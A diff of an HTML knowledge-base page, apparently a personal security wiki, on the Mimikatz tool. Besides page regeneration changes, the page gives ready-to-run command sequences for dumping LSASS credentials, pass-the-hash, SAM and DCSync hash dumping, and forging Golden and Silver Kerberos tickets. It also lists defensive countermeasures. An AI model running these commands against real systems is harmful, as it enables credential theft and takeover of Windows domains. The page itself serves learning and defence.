@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:58 -->
+<!-- 2026-07-30 Thu 22:15 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>mimikatz</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,20 +886,20 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org2c52721">How It Works</a></li>
-<li><a href="#orgf19eb52">Core Commands</a></li>
-<li><a href="#org46ab739">Examples</a>
+<li><a href="#org6f5526f">How It Works</a></li>
+<li><a href="#orga2f7b1b">Core Commands</a></li>
+<li><a href="#org4653c09">Examples</a>
 <ul>
-<li><a href="#org35b8d04">1. Dumping Cleartext Passwords (WDigest)</a></li>
-<li><a href="#org055acda">2. Pass-the-Hash (PtH)</a></li>
-<li><a href="#org2da3875">3. Extracting Hashes from the SAM</a></li>
-<li><a href="#org4d24444">4. DCSync — Dumping Domain Hashes Remotely</a></li>
-<li><a href="#org95231b4">5. Golden Ticket</a></li>
-<li><a href="#org0f3c174">6. Silver Ticket</a></li>
+<li><a href="#org9f6379e">1. Dumping Cleartext Passwords (WDigest)</a></li>
+<li><a href="#orgbc1faf8">2. Pass-the-Hash (PtH)</a></li>
+<li><a href="#org2140f15">3. Extracting Hashes from the SAM</a></li>
+<li><a href="#orgd4ab02b">4. DCSync — Dumping Domain Hashes Remotely</a></li>
+<li><a href="#org3fa2ca0">5. Golden Ticket</a></li>
+<li><a href="#orgd53935f">6. Silver Ticket</a></li>
 </ul>
 </li>
-<li><a href="#org01ffafe">Defensive Countermeasures</a></li>
-<li><a href="#org743e705">Tips</a></li>
+<li><a href="#org5d0799b">Defensive Countermeasures</a></li>
+<li><a href="#orgb91a471">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -901,9 +919,9 @@ Related: <a href="20260327T190647--active-directory__concept.html">Active Direct
          <a href="20260213T071359--bloodhound__cybersecurity_tool.html">Bloodhound</a>
          <a href="20260314T005713--lateral-movement__concept_cybersecurity.html">Lateral movement</a>
 </p>
-<div id="outline-container-org2c52721" class="outline-2">
-<h2 id="org2c52721">How It Works</h2>
-<div class="outline-text-2" id="text-org2c52721">
+<div id="outline-container-org6f5526f" class="outline-2">
+<h2 id="org6f5526f">How It Works</h2>
+<div class="outline-text-2" id="text-org6f5526f">
 <p>
 Mimikatz primarily targets the <b>Local Security Authority Subsystem
 Service (LSASS)</b>. This is the Windows process responsible for
@@ -916,11 +934,11 @@ Nearly every command requires elevated privileges first:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_33ce365f11e14af7844c528cebe6919f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_b015ba3fd0554417a53e43ed1b4d1870>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_33ce365f11e14af7844c528cebe6919f=document.querySelector('button[name=btn_33ce365f11e14af7844c528cebe6919f]');
-copyBtnbtn_33ce365f11e14af7844c528cebe6919f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`privilege::debug\n`);copyBtnbtn_33ce365f11e14af7844c528cebe6919f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_33ce365f11e14af7844c528cebe6919f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b015ba3fd0554417a53e43ed1b4d1870=document.querySelector('button[name=btn_b015ba3fd0554417a53e43ed1b4d1870]');
+copyBtnbtn_b015ba3fd0554417a53e43ed1b4d1870.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`privilege::debug\n`);copyBtnbtn_b015ba3fd0554417a53e43ed1b4d1870.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b015ba3fd0554417a53e43ed1b4d1870.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -934,9 +952,9 @@ silently or with an access-denied error without it.
 </p>
 </div>
 </div>
-<div id="outline-container-orgf19eb52" class="outline-2">
-<h2 id="orgf19eb52">Core Commands</h2>
-<div class="outline-text-2" id="text-orgf19eb52">
+<div id="outline-container-orga2f7b1b" class="outline-2">
+<h2 id="orga2f7b1b">Core Commands</h2>
+<div class="outline-text-2" id="text-orga2f7b1b">
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
@@ -1005,30 +1023,30 @@ silently or with an access-denied error without it.
 </table>
 </div>
 </div>
-<div id="outline-container-org46ab739" class="outline-2">
-<h2 id="org46ab739">Examples</h2>
-<div class="outline-text-2" id="text-org46ab739">
+<div id="outline-container-org4653c09" class="outline-2">
+<h2 id="org4653c09">Examples</h2>
+<div class="outline-text-2" id="text-org4653c09">
 </div>
-<div id="outline-container-org35b8d04" class="outline-3">
-<h3 id="org35b8d04">1. Dumping Cleartext Passwords (WDigest)</h3>
-<div class="outline-text-3" id="text-org35b8d04">
+<div id="outline-container-org9f6379e" class="outline-3">
+<h3 id="org9f6379e">1. Dumping Cleartext Passwords (WDigest)</h3>
+<div class="outline-text-3" id="text-org9f6379e">
 <p>
 In older or misconfigured Windows systems, Mimikatz can pull
 passwords directly in plain text.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_094b0519334a4a7f813eedbfe138c640>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_7939bce4553243ff8e30f144bcd00222>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_094b0519334a4a7f813eedbfe138c640=document.querySelector('button[name=btn_094b0519334a4a7f813eedbfe138c640]');
-copyBtnbtn_094b0519334a4a7f813eedbfe138c640.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Standard sequence to get credentials\nprivilege::debug           # Grant debug privileges to the tool\nsekurlsa::logonpasswords    # Extract passwords from memory\n`);copyBtnbtn_094b0519334a4a7f813eedbfe138c640.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_094b0519334a4a7f813eedbfe138c640.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7939bce4553243ff8e30f144bcd00222=document.querySelector('button[name=btn_7939bce4553243ff8e30f144bcd00222]');
+copyBtnbtn_7939bce4553243ff8e30f144bcd00222.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Standard sequence to get credentials\nprivilege::debug           # Grant debug privileges to the tool\nsekurlsa::logonpasswords    # Extract passwords from memory\n`);copyBtnbtn_7939bce4553243ff8e30f144bcd00222.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7939bce4553243ff8e30f144bcd00222.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Standard sequence to get credentials
-</span>privilege::debug           <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># Grant debug privileges to the tool
-</span>sekurlsa::logonpasswords    <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># Extract passwords from memory</span>
+<pre class="src src-powershell"># Standard sequence to get credentials
+privilege::debug           # Grant debug privileges to the tool
+sekurlsa::logonpasswords    # Extract passwords from memory
 </pre>
 </div></div>
 
@@ -1039,43 +1057,43 @@ Windows 8.1/Server 2012 R2.
 </p>
 </div>
 </div>
-<div id="outline-container-org055acda" class="outline-3">
-<h3 id="org055acda">2. Pass-the-Hash (PtH)</h3>
-<div class="outline-text-3" id="text-org055acda">
+<div id="outline-container-orgbc1faf8" class="outline-3">
+<h3 id="orgbc1faf8">2. Pass-the-Hash (PtH)</h3>
+<div class="outline-text-3" id="text-orgbc1faf8">
 <p>
 If an attacker has the NTLM hash of an admin, they can spawn a new
 process acting as that user.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_613d959e68774ecdad3d6a093aa4ad89>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_e2a3a0c23e944953acad885cbc3b5a0c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_613d959e68774ecdad3d6a093aa4ad89=document.querySelector('button[name=btn_613d959e68774ecdad3d6a093aa4ad89]');
-copyBtnbtn_613d959e68774ecdad3d6a093aa4ad89.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Launch a command prompt as 'Administrator' using only their NTLM hash\nsekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:ab1234567890abcdef1234567890abcd\n`);copyBtnbtn_613d959e68774ecdad3d6a093aa4ad89.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_613d959e68774ecdad3d6a093aa4ad89.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e2a3a0c23e944953acad885cbc3b5a0c=document.querySelector('button[name=btn_e2a3a0c23e944953acad885cbc3b5a0c]');
+copyBtnbtn_e2a3a0c23e944953acad885cbc3b5a0c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Launch a command prompt as 'Administrator' using only their NTLM hash\nsekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:ab1234567890abcdef1234567890abcd\n`);copyBtnbtn_e2a3a0c23e944953acad885cbc3b5a0c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e2a3a0c23e944953acad885cbc3b5a0c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Launch a command prompt as 'Administrator' using only their NTLM hash
-</span>sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:ab1234567890abcdef1234567890abcd
+<pre class="src src-powershell"># Launch a command prompt as 'Administrator' using only their NTLM hash
+sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:ab1234567890abcdef1234567890abcd
 </pre>
 </div></div>
 </div>
 </div>
-<div id="outline-container-org2da3875" class="outline-3">
-<h3 id="org2da3875">3. Extracting Hashes from the SAM</h3>
-<div class="outline-text-3" id="text-org2da3875">
+<div id="outline-container-org2140f15" class="outline-3">
+<h3 id="org2140f15">3. Extracting Hashes from the SAM</h3>
+<div class="outline-text-3" id="text-org2140f15">
 <p>
 If the attacker has local admin rights, they can dump the local
 account database.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_3199507092974e08b3ea2bf1fde44ee3>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_104a562991e7479fb24717e3945977a3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3199507092974e08b3ea2bf1fde44ee3=document.querySelector('button[name=btn_3199507092974e08b3ea2bf1fde44ee3]');
-copyBtnbtn_3199507092974e08b3ea2bf1fde44ee3.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`lsadump::sam\n`);copyBtnbtn_3199507092974e08b3ea2bf1fde44ee3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3199507092974e08b3ea2bf1fde44ee3.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_104a562991e7479fb24717e3945977a3=document.querySelector('button[name=btn_104a562991e7479fb24717e3945977a3]');
+copyBtnbtn_104a562991e7479fb24717e3945977a3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`lsadump::sam\n`);copyBtnbtn_104a562991e7479fb24717e3945977a3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_104a562991e7479fb24717e3945977a3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1084,9 +1102,9 @@ let res = copyTextToClipboard(`lsadump::sam\n`);copyBtnbtn_3199507092974e08b3ea2
 </div></div>
 </div>
 </div>
-<div id="outline-container-org4d24444" class="outline-3">
-<h3 id="org4d24444">4. DCSync — Dumping Domain Hashes Remotely</h3>
-<div class="outline-text-3" id="text-org4d24444">
+<div id="outline-container-orgd4ab02b" class="outline-3">
+<h3 id="orgd4ab02b">4. DCSync — Dumping Domain Hashes Remotely</h3>
+<div class="outline-text-3" id="text-orgd4ab02b">
 <p>
 If the compromised account has Replicating Directory Changes rights
 (often via <code>GenericAll=/=DCSync</code> edge in BloodHound), the domain's
@@ -1094,26 +1112,26 @@ password hashes can be pulled without ever touching the DC's disk.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_0d829b25535646659d1b7b92a9a8d7e7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_3f2b76fdbc56418d8a1dddf6c58f539f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0d829b25535646659d1b7b92a9a8d7e7=document.querySelector('button[name=btn_0d829b25535646659d1b7b92a9a8d7e7]');
-copyBtnbtn_0d829b25535646659d1b7b92a9a8d7e7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Dump krbtgt hash specifically — needed for a Golden Ticket\nlsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt\n\n# Dump a specific user\nlsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator\n`);copyBtnbtn_0d829b25535646659d1b7b92a9a8d7e7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0d829b25535646659d1b7b92a9a8d7e7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3f2b76fdbc56418d8a1dddf6c58f539f=document.querySelector('button[name=btn_3f2b76fdbc56418d8a1dddf6c58f539f]');
+copyBtnbtn_3f2b76fdbc56418d8a1dddf6c58f539f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Dump krbtgt hash specifically — needed for a Golden Ticket\nlsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt\n\n# Dump a specific user\nlsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator\n`);copyBtnbtn_3f2b76fdbc56418d8a1dddf6c58f539f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3f2b76fdbc56418d8a1dddf6c58f539f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Dump krbtgt hash specifically &#8212; needed for a Golden Ticket
-</span>lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
+<pre class="src src-powershell"># Dump krbtgt hash specifically — needed for a Golden Ticket
+lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
 
-<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Dump a specific user
-</span>lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
+# Dump a specific user
+lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
 </pre>
 </div></div>
 </div>
 </div>
-<div id="outline-container-org95231b4" class="outline-3">
-<h3 id="org95231b4">5. Golden Ticket</h3>
-<div class="outline-text-3" id="text-org95231b4">
+<div id="outline-container-org3fa2ca0" class="outline-3">
+<h3 id="org3fa2ca0">5. Golden Ticket</h3>
+<div class="outline-text-3" id="text-org3fa2ca0">
 <p>
 With the krbtgt hash (from DCSync or a compromised DC), forge a
 Kerberos TGT granting Domain Admin access to the entire domain,
@@ -1121,11 +1139,11 @@ valid until the krbtgt password is rotated twice.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_7bf2486217c84bf98aed576c8b0cb1c2>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_eb7fa12a6a9245f6b39fcb6449a038da>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7bf2486217c84bf98aed576c8b0cb1c2=document.querySelector('button[name=btn_7bf2486217c84bf98aed576c8b0cb1c2]');
-copyBtnbtn_7bf2486217c84bf98aed576c8b0cb1c2.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \\\n  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\\n  /krbtgt:<krbtgt_ntlm_hash> /ticket:golden.kirbi\n\n# Inject into current session\nkerberos::ptt golden.kirbi\n`);copyBtnbtn_7bf2486217c84bf98aed576c8b0cb1c2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7bf2486217c84bf98aed576c8b0cb1c2.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_eb7fa12a6a9245f6b39fcb6449a038da=document.querySelector('button[name=btn_eb7fa12a6a9245f6b39fcb6449a038da]');
+copyBtnbtn_eb7fa12a6a9245f6b39fcb6449a038da.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \\\n  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\\n  /krbtgt:<krbtgt_ntlm_hash> /ticket:golden.kirbi\n\n# Inject into current session\nkerberos::ptt golden.kirbi\n`);copyBtnbtn_eb7fa12a6a9245f6b39fcb6449a038da.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_eb7fa12a6a9245f6b39fcb6449a038da.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1133,15 +1151,15 @@ let res = copyTextToClipboard(`kerberos::golden /user:Administrator /domain:DOMA
   /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
   /krbtgt:&lt;krbtgt_ntlm_hash&gt; /ticket:golden.kirbi
 
-<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Inject into current session
-</span>kerberos::ptt golden.kirbi
+# Inject into current session
+kerberos::ptt golden.kirbi
 </pre>
 </div></div>
 </div>
 </div>
-<div id="outline-container-org0f3c174" class="outline-3">
-<h3 id="org0f3c174">6. Silver Ticket</h3>
-<div class="outline-text-3" id="text-org0f3c174">
+<div id="outline-container-orgd53935f" class="outline-3">
+<h3 id="orgd53935f">6. Silver Ticket</h3>
+<div class="outline-text-3" id="text-orgd53935f">
 <p>
 With a service account's NTLM hash, forge a TGS for that specific
 service only — narrower than a Golden Ticket but doesn't touch the
@@ -1149,11 +1167,11 @@ krbtgt account and is harder to detect via krbtgt-focused monitoring.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_6b7b6e2561c94808802c126849641bba>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_f27b130e0e424c70a93ee60f62ea0abd>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6b7b6e2561c94808802c126849641bba=document.querySelector('button[name=btn_6b7b6e2561c94808802c126849641bba]');
-copyBtnbtn_6b7b6e2561c94808802c126849641bba.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`kerberos::silver /user:Administrator /domain:DOMAIN.LOCAL \\\n  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\\n  /target:dc01.domain.local /service:cifs \\\n  /rc4:<service_account_ntlm_hash> /ticket:silver.kirbi\n\nkerberos::ptt silver.kirbi\n`);copyBtnbtn_6b7b6e2561c94808802c126849641bba.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6b7b6e2561c94808802c126849641bba.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f27b130e0e424c70a93ee60f62ea0abd=document.querySelector('button[name=btn_f27b130e0e424c70a93ee60f62ea0abd]');
+copyBtnbtn_f27b130e0e424c70a93ee60f62ea0abd.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`kerberos::silver /user:Administrator /domain:DOMAIN.LOCAL \\\n  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\\n  /target:dc01.domain.local /service:cifs \\\n  /rc4:<service_account_ntlm_hash> /ticket:silver.kirbi\n\nkerberos::ptt silver.kirbi\n`);copyBtnbtn_f27b130e0e424c70a93ee60f62ea0abd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f27b130e0e424c70a93ee60f62ea0abd.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1168,9 +1186,9 @@ kerberos::ptt silver.kirbi
 </div>
 </div>
 </div>
-<div id="outline-container-org01ffafe" class="outline-2">
-<h2 id="org01ffafe">Defensive Countermeasures</h2>
-<div class="outline-text-2" id="text-org01ffafe">
+<div id="outline-container-org5d0799b" class="outline-2">
+<h2 id="org5d0799b">Defensive Countermeasures</h2>
+<div class="outline-text-2" id="text-org5d0799b">
 <p>
 Because Mimikatz is so effective, modern Windows versions have
 introduced several protections:
@@ -1187,9 +1205,9 @@ and quarantine the <code>mimikatz.exe</code> binary.</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org743e705" class="outline-2">
-<h2 id="org743e705">Tips</h2>
-<div class="outline-text-2" id="text-org743e705">
+<div id="outline-container-orgb91a471" class="outline-2">
+<h2 id="orgb91a471">Tips</h2>
+<div class="outline-text-2" id="text-orgb91a471">
 <ul class="org-ul">
 <li>Run <code>privilege::debug</code> first, every session — the single most
 common reason a command silently fails</li>
@@ -1215,6 +1233,20 @@ result as a tool failure</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1222,6 +1254,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
